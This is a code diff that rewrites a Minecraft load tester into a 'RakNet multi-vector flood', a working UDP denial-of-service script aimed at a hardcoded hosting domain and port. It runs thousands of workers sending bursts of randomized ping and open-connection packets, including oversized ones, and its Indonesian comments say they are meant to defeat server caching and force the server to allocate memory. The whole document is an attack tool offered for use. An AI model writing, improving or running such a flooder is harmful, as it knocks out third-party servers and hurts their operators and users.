@@ -1,4 +1,4 @@
-# combo_load.py — Java TCP + Bedrock UDP combo load generator
+# bedrock_load.py — RakNet multi-vector flood, gacor edition
 # python 3.12 | stdlib only
 
 import asyncio
@@ -7,199 +7,162 @@ import random
 import signal
 import socket
 import struct
-import string
 import time
 
 HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
 PORT     = int(os.environ.get("PORT", "5073"))
 DURATION = int(os.environ.get("DURATION", "1800"))
-CONC_J   = int(os.environ.get("CONC_J", "1000"))   # java workers
-CONC_B   = int(os.environ.get("CONC_B", "1000"))   # bedrock workers
+CONC     = int(os.environ.get("CONC", "5000"))
+SOCKET_PER_WORKER = int(os.environ.get("SOCKETS", "2"))
 SHARD    = os.environ.get("SHARD", "0")
-
-CONNECT_TIMEOUT  = 5.0
-READ_TIMEOUT     = 3.0
-PROTOCOL_VERSION = 763   # 1.20.1
-
-STATE_STATUS = 1
-STATE_LOGIN  = 2
 
 RAKNET_MAGIC = bytes([
     0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
     0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
 ])
 
-
-# ---- Java helpers ----
-def vi_write(v: int) -> bytes:
-    out = b""
-    while True:
-        b = v & 0x7F
-        v >>= 7
-        out += bytes([b | 0x80]) if v else bytes([b])
-        if not v:
-            return out
+# Rentang protocol version RakNet Bedrock 1.20.x — variasi biar servernya
+# ga bisa pakai fast-path cache
+PROTO_VERSIONS = [11, 10, 9, 8]
 
 
-def pack_string(s: str) -> bytes:
-    r = s.encode("utf-8")
-    return vi_write(len(r)) + r
-
-
-def pack_packet(pid: int, payload: bytes = b"") -> bytes:
-    body = vi_write(pid) + payload
-    return vi_write(len(body)) + body
-
-
-def hs_java(host: str, port: int, state: int) -> bytes:
-    p = (vi_write(PROTOCOL_VERSION) + pack_string(host)
-         + struct.pack(">H", port) + vi_write(state))
-    return pack_packet(0x00, p)
-
-
-def rand_name_java() -> str:
-    return "".join(random.choices(string.ascii_letters + string.digits,
-                                  k=random.randint(3, 16)))
-
-
-# ---- Bedrock helpers ----
-def rak_ping() -> bytes:
-    t = int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF
+def pkt_ping():
+    """0x01 unconnected ping — server balas 0x1c unconnected pong + info."""
+    t = random.getrandbits(64)
     g = random.getrandbits(64)
     return b"\x01" + struct.pack(">Q", t) + RAKNET_MAGIC + struct.pack(">Q", g)
 
 
-def rak_oc1() -> bytes:
-    return b"\x05" + RAKNET_MAGIC + bytes([11]) + struct.pack(">H", 0)
+def pkt_oc1():
+    """0x05 open connection request 1 — server alokasi state, balas 0x06."""
+    proto = random.choice(PROTO_VERSIONS)
+    mtu_pad = random.choice([0, 100, 500, 1200, 1400])
+    return (b"\x05" + RAKNET_MAGIC + bytes([proto])
+            + struct.pack(">H", mtu_pad))
 
 
-def rak_oc2() -> bytes:
-    return (b"\x07" + RAKNET_MAGIC + struct.pack(">I", random.getrandbits(32))
-            + b"\x00")
+def pkt_oc2():
+    """0x07 open connection request 2 — server proses encryption handshake."""
+    cookie = random.getrandbits(32)
+    return (b"\x07" + RAKNET_MAGIC + struct.pack(">I", cookie)
+            + bytes([random.randint(0, 1)]))
+
+
+def pkt_incompat():
+    """0x19 incompatible protocol — server kadang balas + log."""
+    proto = random.choice(PROTO_VERSIONS)
+    return (b"\x19" + bytes([proto]) + RAKNET_MAGIC
+            + struct.pack(">Q", random.getrandbits(64)))
+
+
+def pkt_oc1_oversized():
+    """0x05 dengan padding gede — paksa server alokasi buffer lebih."""
+    proto = random.choice(PROTO_VERSIONS)
+    pad = os.urandom(random.randint(1200, 1400))
+    return b"\x05" + RAKNET_MAGIC + bytes([proto]) + pad
+
+
+PACKET_BUILDERS = [
+    (pkt_ping, 0.35),
+    (pkt_oc1, 0.30),
+    (pkt_oc2, 0.20),
+    (pkt_incompat, 0.10),
+    (pkt_oc1_oversized, 0.05),
+]
+
+
+def pick_pkt():
+    r = random.random()
+    cum = 0.0
+    for builder, weight in PACKET_BUILDERS:
+        cum += weight
+        if r <= cum:
+            return builder()
+    return pkt_ping()
 
 
 # ---- stats ----
 class Stats:
     def __init__(self):
-        self.j_ok = 0
-        self.j_fail = 0
-        self.b_sent = 0
-        self.b_rx = 0
-        self.b_rx_bytes = 0
-        self.b_fail = 0
+        self.sent = 0
+        self.rx = 0
+        self.rx_bytes = 0
+        self.fail = 0
         self.start = time.time()
         self.lock = asyncio.Lock()
 
-    async def inc_j(self, ok=0, fail=0):
+    async def inc(self, sent=0, rx=0, b=0, fail=0):
         async with self.lock:
-            self.j_ok += ok
-            self.j_fail += fail
-
-    async def inc_b(self, sent=0, rx=0, b=0, fail=0):
-        async with self.lock:
-            self.b_sent += sent
-            self.b_rx += rx
-            self.b_rx_bytes += b
-            self.b_fail += fail
+            self.sent += sent
+            self.rx += rx
+            self.rx_bytes += b
+            self.fail += fail
 
     def snap(self) -> str:
         dt = max(1e-6, time.time() - self.start)
-        return (f"[shard {SHARD}] J ok={self.j_ok} fail={self.j_fail} "
-                f"rate={self.j_ok / dt:.0f} | "
-                f"B sent={self.b_sent} rx={self.b_rx} "
-                f"rxb={self.b_rx_bytes} fail={self.b_fail} "
-                f"rate={self.b_sent / dt:.0f}")
+        ratio = (self.rx / self.sent * 100) if self.sent else 0.0
+        return (f"[shard {SHARD}] sent={self.sent} rx={self.rx} "
+                f"({ratio:.1f}%) rxb={self.rx_bytes} fail={self.fail} "
+                f"rate={self.sent / dt:.0f} pkt/s")
 
 
 STATS = Stats()
 STOP = asyncio.Event()
 
 
-# ============ JAVA WORKER (TCP) ============
-async def java_join_once():
-    """Handshake state=LOGIN + Login Start + tahan sebentar."""
-    try:
-        r, w = await asyncio.wait_for(
-            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
-        w.write(hs_java(HOST, PORT, STATE_LOGIN))
-        w.write(pack_packet(0x00, pack_string(rand_name_java())))
-        await w.drain()
-        await asyncio.sleep(random.uniform(0.2, 0.8))
-        w.close()
-        await STATS.inc_j(ok=1)
-    except (asyncio.TimeoutError, OSError):
-        await STATS.inc_j(fail=1)
-
-
-async def java_handshake_once():
-    """Handshake state=STATUS + Status Request, langsung close."""
-    pkt = hs_java(HOST, PORT, STATE_STATUS) + pack_packet(0x00)
-    try:
-        r, w = await asyncio.wait_for(
-            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
-        w.write(pkt)
-        await w.drain()
-        w.close()
-        await STATS.inc_j(ok=1)
-    except (asyncio.TimeoutError, OSError):
-        await STATS.inc_j(fail=1)
-
-
-async def java_worker():
-    while not STOP.is_set():
-        r = random.random()
-        if r < 0.6:
-            await java_join_once()
-        else:
-            await java_handshake_once()
-
-
-# ============ BEDROCK WORKER (UDP) ============
 class BedrockWorker:
     def __init__(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
-        self.sock.setblocking(False)
-        self.pkts = [rak_ping(), rak_oc1(), rak_oc2()]
+        self.socks = []
+        for _ in range(SOCKET_PER_WORKER):
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
+            s.setblocking(False)
+            self.socks.append(s)
+        self.rr = 0
 
     async def run(self):
         while not STOP.is_set():
+            sock = self.socks[self.rr]
+            self.rr = (self.rr + 1) % len(self.socks)
             try:
-                pkt = random.choice(self.pkts)
-                self.sock.sendto(pkt, (HOST, PORT))
-                await STATS.inc_b(sent=1)
-                # coba baca balasan (non-blocking)
-                for _ in range(3):
+                # burst: kirim 4 paket berturut-turut sebelum yield
+                for _ in range(4):
+                    pkt = pick_pkt()
                     try:
-                        data, _ = self.sock.recvfrom(4096)
-                        await STATS.inc_b(rx=1, b=len(data))
+                        sock.sendto(pkt, (HOST, PORT))
+                        await STATS.inc(sent=1)
+                    except OSError:
+                        await STATS.inc(fail=1)
+                # baca balasan (non-blocking) — sampe buffer abis
+                for _ in range(8):
+                    try:
+                        data, _ = sock.recvfrom(4096)
+                        await STATS.inc(rx=1, b=len(data))
                     except BlockingIOError:
                         break
                     except OSError:
                         break
-                await asyncio.sleep(0.0001)
-            except OSError:
-                await STATS.inc_b(fail=1)
+                # yield ringan — jangan burn CPU lokal
+                await asyncio.sleep(0)
+            except Exception:
+                await STATS.inc(fail=1)
 
 
-# ============ REPORTER ============
 async def reporter():
     while not STOP.is_set():
         await asyncio.sleep(3)
         print(STATS.snap(), flush=True)
 
 
-# ============ MAIN ============
 async def main():
-    print(f"[shard {SHARD}] host={HOST} port={PORT} "
-          f"java_conc={CONC_J} bedrock_conc={CONC_B} dur={DURATION}s",
+    print(f"[shard {SHARD}] UDP target={HOST}:{PORT} conc={CONC} "
+          f"sockets/worker={SOCKET_PER_WORKER} dur={DURATION}s",
           flush=True)
 
-    java_tasks = [asyncio.create_task(java_worker()) for _ in range(CONC_J)]
-    bedrock_workers = [BedrockWorker() for _ in range(CONC_B)]
-    bedrock_tasks = [asyncio.create_task(w.run()) for w in bedrock_workers]
+    workers = [BedrockWorker() for _ in range(CONC)]
+    tasks = [asyncio.create_task(w.run()) for w in workers]
     rep = asyncio.create_task(reporter())
 
     try:
@@ -207,10 +170,9 @@ async def main():
     finally:
         STOP.set()
         rep.cancel()
-        for t in java_tasks + bedrock_tasks:
+        for t in tasks:
             t.cancel()
-        await asyncio.gather(*(java_tasks + bedrock_tasks),
-                             return_exceptions=True)
+        await asyncio.gather(*tasks, return_exceptions=True)
 
     print(STATS.snap(), flush=True)
 
